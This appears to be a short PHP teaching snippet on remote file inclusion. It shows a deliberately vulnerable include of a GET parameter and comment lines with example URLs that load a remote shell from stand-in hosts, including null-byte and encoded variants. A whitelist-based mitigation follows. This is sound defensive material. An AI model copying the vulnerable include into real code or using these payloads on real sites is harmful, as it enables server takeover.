<?php
  $file = $_GET['file'];
  include($file . '.php');
  // http://example.com/vulnerable_rfi.php?file=http://evilsite.com/malicious_file
  // http://vulnerable-website.com/index.php?page=http://malicious.com/shell.txt%00.php
  // http://vulnerable-website.com/index.php?page=http%3A%2F%2Fmalicious.com%2Fshell.php
  // http://vulnerable-website.com/index.php?page=http%253A%252F%252Fmalicious.com%252Fshell.php
?>

mitigation:
<?php
// Whitelist of Allowed Files
$AllowedFiles = ['home', 'category', 'edit', 'about', 'contact us'];
$UserInput = $_GET['page'] ?? 'home' ;
if (in_array($UserInput, $AllowedFiles)) {
    include "pages/$UserInput.php";
} else {
    echo "invali page";
    exit;
}

// Disable allow_url_include in php.ini
// Ensure that PHP does not allow including remote files via URLs.

// Disable allow_url_fopen in php.ini
// This setting disables the ability to use URLs as file paths in PHP functions like include and require
?>